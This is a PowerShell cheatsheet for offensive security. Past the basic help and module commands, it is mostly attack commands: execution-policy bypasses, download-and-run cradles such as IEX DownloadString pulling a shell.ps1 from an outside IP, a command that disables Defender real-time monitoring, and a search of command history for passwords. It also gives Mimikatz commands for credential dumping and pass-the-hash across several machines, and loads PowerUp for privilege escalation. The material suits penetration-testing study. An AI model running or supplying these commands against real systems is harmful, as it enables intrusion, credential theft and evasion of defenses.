# Cheatsheet

## Help System

`Get-Help Get-Process`
`help Get-Process`
`Update-Help`

`Get-Help remoting`
`Get-Help about_*remot*`

`Get-Command -CommandTyle Cmdlet`

## Basic Constructs

```
Cmdlets
Function
```

## Aliases

`Get-Alias -Name ps`
`Get-Alias -Definition Get-Process`

## Check Environment

- Version info: `powershell -v 2.0 -c $psversiontable`
- Language mode: `$host.runspace.languagemode`
- Check if AppLocker is enabled: `Get-AppLockerPolicy -Local`

## Download Files
```
powershell wget "http://example.com/abc.txt" -outfile "abc.txt"
```

## Execution Policy

- Not a security feature
- Used to avoid accidental script execution
- Can be bypass with:
  - `powershell -executionpolicy bypass .\example.ps1`
  - `powershell -c <cmd>`
  - `powershell -enc`

> Ref https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6

## Modules

`Import-Module <path_to_module> -verbose`
`Get-Module -ListAvailable`
`Get-Command -Module <module_name>`

## Remote Script execution

- `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
- `iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
- `powershell -EncodedCommand <Base64EncodedCommand>`

```
START /B ​ ""​ powershell -c IEX (​ New-Object
Net.Webclient).downloadstring(​ 'http://10.10.14.2/shell.ps1'​ )
```
_/B prevents creation of a new window_

- Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter

## Command History (PSReadline)

```
cat (Get-PSReadlineOption).HistorySavePath | sls password
```
By default, the path is:
```
profile:\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Powershell Remoting

- Enabled by default from Windows Server 2012
- Admin privileges are required to connect

### One to One

- Uses PSSession
  - Interactive, stateful session
  - Run in a new process `wsmprovhost`

### Useful cmdlets

New-PSSession
Enter-PSSession

```
Set-MpPreference -DisableRealtimeMonitoring $true
New-PSSession -ComputerName instance

$sess = New-PSSession -ComputerName instance
Enter-PSSEssion - Session $sess
```
### One to Many (Fan-out Remoting)

- Non-interactive
- Parallel command execution
- Can execute scripts from files
- Usable to perform command execution without dropping exe onto disk
- Useful for passing and replying hashes, tickets and other AD attacks

Run commands:
```
Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName instance
```

Run scripts:
```
Invoke-Command -FilePath example.ps1 -ComputerName instance
```

Run functions installed on the remote box:
```
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance
```

Stateful commands:
```
$sess = New-PSSession -ComputerName instance
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

Mimikatz (ReflectivePEInjection is used to load into memory)
```
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCerts
```

Pass the Hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<name_of_the_user> /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
```
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator  /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
```

Dump Creds from multiple machines
```
Invoke-Mimikatz -DumpCreds -ComputerName @("instance1", "instance2")
```

## Load PowerUp

```
powershell -ExecutionPolicy Bypass
Import-Module ./PowerUp.ps1​
Invoke-AllChecks​
```
